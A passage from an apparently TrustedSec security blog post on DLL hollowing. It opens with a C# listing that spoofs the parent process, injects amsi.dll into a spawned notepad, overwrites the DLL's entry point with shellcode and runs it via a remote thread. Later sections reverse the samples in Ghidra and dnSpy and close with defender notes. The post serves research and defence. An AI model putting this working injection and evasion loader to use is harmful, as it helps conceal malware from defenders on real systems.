   107	            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
   108	            var lpSize = IntPtr.Zero;
   109	            Utility.Win32.InitializeProcThreadAttributeList( IntPtr.Zero, 2, 0, ref lpSize);
   110	            startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
   111	            Utility.Win32.InitializeProcThreadAttributeList( startInfoEx.lpAttributeList, 2, 0, ref lpSize);
   112
   113	            Marshal.WriteIntPtr( lpValue, new IntPtr((long)Utility.Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));
   114
   115	            Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, 0, (IntPtr)Utility.Win32.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
   116
   117	            var parentHandle = IntPtr.Zero;
   118	            string[] processes = {"explorer", "services","svchosts"};
   119	            foreach (string process in processes)
   120	            {
   121	               try
   122	                {
   123	                    Console.WriteLine("trying Parent:: " + process);
   124	                    parentHandle = Process.GetProcessesByName(process)[0].Handle;
   125	                }
   126	                catch (Exception)
   127	                {
   128	                    continue;
   129	                }
   130	                break;
   131	            }
   132	            if (parentHandle != IntPtr.Zero)
   133	            {
   134	                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
   135	                Marshal.WriteIntPtr(lpValue, parentHandle);
   136
   137	                Utility.Win32.UpdateProcThreadAttribute( startInfoEx.lpAttributeList, 0, (IntPtr)Utility.Win32.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
   138	            }
   139
   140	            Utility.Win32.CreateProcess( null, "notepad", ref processSecurity, ref threadSecurity, false, Utility.Win32.CreationFlags.ExtendedStartupInfoPresent | Utility.Win32.CreationFlags.DetachedProcess, IntPtr.Zero, null, ref startInfoEx, out processInfo);
   141
   142	/*************************/
   143	//          End PPID Spoofing
   144	/*************************/
   145
   146
   147	// Loadlibrary(amsi.dll)
   148	// Parse out the entry point to the amsi.dll
   149	// Change memory permissions for the are to allow read write
   150	// Write shellcode to the entry point
   151	// Change memory permissions for the entrypoint to the original value
   152	// Create a new thread executing the entrypoint of the amsi.dll
   153	// Loop for exit. Shellcode only runs when this program is open
   154
   155	/*************************/
   156	// Load the requested Library
   157	/*************************/
   158
   159	            IntPtr hProcess = processInfo.hProcess;
   160
   161	            // allocate memory, into the remote process memory, for the name of the dll to inject
   162	            IntPtr remoteDLLInjectName = Utility.Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dll_name.Length, (uint)0x1000, (uint)4); // 0x4 == PAGE_READWRITE
   163	            if ( remoteDLLInjectName == IntPtr.Zero) goto EXIT;
   164	            Console.WriteLine("[*] {0}: Dll Name Address in Remote Process: 0x{1:X}", dll_name, (Int64)remoteDLLInjectName);
   165
   166	            IntPtr zero = IntPtr.Zero;
   167	            // copy, into the remote process memory, the name of the dll to inject
   168	            Utility.Win32.WriteProcessMemory(hProcess, remoteDLLInjectName, Encoding.Default.GetBytes(dll_name), dll_name.Length, out zero);
   169
   170	            IntPtr hKernel32 = Utility.Win32.GetModuleHandleA("Kernel32");
   171	            if ( hKernel32 == IntPtr.Zero) goto EXIT;
   172
   173	            IntPtr loadlibrary_addr = Utility.Win32.GetProcAddress(hKernel32, "LoadLibraryA");
   174	            IntPtr hDllThread = Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadlibrary_addr, remoteDLLInjectName, 0, out zero);
   175	            if ( hDllThread == IntPtr.Zero) goto EXIT;
   176
   177	            Utility.Win32.WaitForSingleObject(hDllThread, 1000);
   178
   179	            // Loop through loaded modules lookin for the one we just created
   180	            long[] module_array = new long[0x100];
   181	            uint module_sz = 0;
   182	            Utility.Win32.EnumProcessModules(hProcess, module_array, (uint)module_array.Length, out module_sz);
   183	            int number_of_modules = (int)(module_sz / 8);
   184
   185	            IntPtr hModule = IntPtr.Zero;
   186	            StringBuilder moduleName = new StringBuilder();
   187	            for (int i = 0; i &lt; number_of_modules; i++)
   188	            {
   189	                hModule = new IntPtr(module_array[i]);
   190	                Utility.Win32.GetModuleBaseName(hProcess, hModule, moduleName, (uint)0x100);
   191	                if (Utility.Win32.strcmp(moduleName.ToString(), "amsi.dll") == true) break;
   192	            }
   193
   194	            if (hModule == IntPtr.Zero) goto EXIT;
   195
   196	            // get DLL's AddressOfEntryPoint
   197	            uint remoteProcessMemory_sz = 0x1000;
   198	            IntPtr remoteProcessMemory = Utility.Win32.VirtualAllocExNuma(Utility.Win32.GetCurrentProcess(), IntPtr.Zero, remoteProcessMemory_sz, 0x3000, 0x4, 0x0 );
   199	            if (remoteProcessMemory == IntPtr.Zero) goto EXIT;
   200
   201	            Utility.Win32.ReadProcessMemory(hProcess, hModule, remoteProcessMemory , (int)remoteProcessMemory_sz, out zero);
   202
   203	            Console.WriteLine("[*] Local Address of the copy of remote Address: 0x{0:X} 0x{1:X}", (Int64)remoteProcessMemory, (Int64)hModule);
   204	            Utility.Win32.IMAGE_DOS_HEADER* mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)remoteProcessMemory;
   205	            Console.WriteLine("[*] {0} mz header PE OFffset 0x{1:X}", dll_name, mz_header->e_lfanew);
   206	            Utility.Win32.IMAGE_NT_HEADERS64* pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((UInt64)remoteProcessMemory + (UInt64)(mz_header->e_lfanew));
   207	            Console.WriteLine("[*] {0} pe_header address 0x{1:X}", dll_name, (Int64)pe_header);
   208	            Console.WriteLine("[*] {0} EntryPoint offset 0x{1:X}", dll_name, pe_header->OptionalHeader.AddressOfEntryPoint);
   209	            IntPtr entryPoint = (IntPtr)(pe_header->OptionalHeader.AddressOfEntryPoint + (UInt64)hModule);
   210	            Console.WriteLine("[*] Dll entryPoint at: 0x{0:X}\n", entryPoint);
   211
   212	            // Overwrite the DLL's entry point with the decoded shellcode
   213	            if (Utility.Win32.WriteProcessMemory(hProcess, entryPoint, buf, encoded_size, out zero))
   214	            {
   215	                // execute shellcode from inside the benign DLL
   216	                Utility.Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, entryPoint, IntPtr.Zero, 0, out zero);
   217	            }
   218	EXIT:
   219	            Console.WriteLine("END");
   220	        }
   221	    }
   222
   223	}
```

### 1.5      Reversing the Code

The C code discussed earlier was compiled into a Windows 64 bit executable using MinGW, then disassembled and decompiled with Ghidra. As you can see below, the Ghidra-generated source code is a very close match to the original.

The figure below is the Ghidra decompilation of the first, simpler sample. As you can see, it does a pretty good job. Again, we didn't implement any type of anti-forensic or obfuscation.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig10_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281274&s=ed19d1d4f11a5a0ea9fb8f99b7d16f92)

The next figure is of the slightly more complex C example. Again, Ghidra does a good job of decompiling the executable to a C code. The below sample is only of the DLL hollowing.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig11_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281276&s=737165861ec19458c70a951fb3f38dc8)

Reversing most C# code is simple with the tool dnSpy ( [https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy)). There are methods to hide or corrupt the EXE so that dnSpy cannot decompile it, but for the most part, attackers do not go to that extent.

To load the executable in dnSpy, simply drag and drop it onto the left pane. Once loaded, the pane will provide a tree listing of the components of the EXE.

The following image is the basic DLL hollowing example as shown in dnSpy. Again, it's very close to the original.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281278&s=7e1efdadb4be840efe3313cdcfe0fd9d)

The next figure shows the dnSpy output of the more complicated program. The image doesn't contain the argument processing, anti-virus, or the PPID spoofing. Again, dnSpy does a pretty good job of extracting readable code from the binary.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=320&q=90&auto=format&fit=max&dm=1706281279&s=0edea8f7867624cf846adc3cbd0099e9)

### 1.6      Conclusion

DLL hollowing just adds more tools for an attacker to hide the malicious content and to make it more difficult for a defender to narrow down the cause. In this case, it will be helpful for the defenders to have lists of known-good processes and what libraries these processes use. In most cases, this isn't possible. During testing, Windows Defender flagged the samples written in C but not those written in C#.

Share

- [Share URL](https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide "Share URL")
- [Share via Email](mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share via Email")
- [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on Facebook")
- [Share on X](http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide "Share on X")
- [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&mini=true "Share on LinkedIn")

CloseShow Transcript